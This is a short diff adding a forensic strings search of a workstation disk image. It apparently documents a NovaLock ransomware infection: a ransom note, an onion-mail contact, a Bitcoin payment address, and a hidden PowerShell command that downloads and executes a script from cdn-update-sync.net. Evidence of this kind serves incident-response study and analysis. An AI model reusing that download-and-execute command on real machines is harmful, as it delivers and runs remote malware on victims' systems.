@@ -1,0 +1,11 @@
+$ srch_strings -t d evidence/working/WS02_mpatel.dd | grep -iE 'novalock|cdn-update-sync|198.51.100|bc1q'
+  52954770   s = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-update-sync.net/invoice/view.php?id=20931')"
+  69741567 $JNOVALOCK
+  69730706 .novalock
+   1152400 === NOVALOCK ===
+   1152624 Contact: novalock_support@onionmail.example | Victim ID: TN-7F3A91C2
+  30710743 NOVALOCK
+  69730663 NovaLock/2.1
+   1152548 To restore files send 0.85 BTC to bc1qnv7l0ck9x2t4h5m8r3e6w0q1z7y4u2p9s5d3f
+  69730819 bc1qnv7l0ck9x2t4h5m8r3e6w0q1z7y4u2p9s5d3f
+  69730676 cdn-update-sync.net
